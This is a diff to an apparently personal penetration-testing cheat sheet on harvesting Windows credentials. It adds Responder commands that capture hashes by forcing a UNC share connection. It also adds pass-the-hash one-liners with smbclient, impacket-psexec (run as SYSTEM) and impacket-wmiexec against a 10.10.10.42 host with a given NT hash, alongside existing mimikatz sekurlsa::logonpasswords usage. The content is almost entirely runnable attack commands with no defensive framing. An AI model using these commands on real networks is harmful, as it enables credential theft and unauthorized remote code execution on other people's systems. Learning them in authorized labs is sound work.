@@ -1,4 +1,17 @@
-## Getting passwords/hashes  
+## Getting passwords/hashes on Windows 
+
+### Responder  
+
+Initialize responder on an interface
+```
+sudo responder -I eth0
+```
+
+Force a connection to a UNC share at the IP address where responder is listening  
+```
+\\192.168.1.10\share
+```
+
 
 ### Mimikatz  
 
@@ -27,6 +40,22 @@ Get passwords/hashes from multiple places
 sekurlsa::logonpasswords
 ```
 
+## Passing the hash  
+
+SMBClient  
+```
+smbclient \\\\10.10.10.42\\share -U Administrator --pw-nt-hash 9a48310ea6f5fdfee955abed1762964b
+```  
+
+Impacket-psexec (executes as SYSTEM)
+```
+impacket-psexec -hashes 00000000000000000000000000000000:9a48310ea6f5fdfee955abed1762964b Administrator@10.10.10.42
+```  
+
+Impacket-wmiexec (executes as user)  
+```
+impacket-wmiexec -hashes 00000000000000000000000000000000:9a48310ea6f5fdfee955abed1762964b Administrator@10.10.10.42
+```
 
 ## Commands/Tools to guess passwords against network services  
 
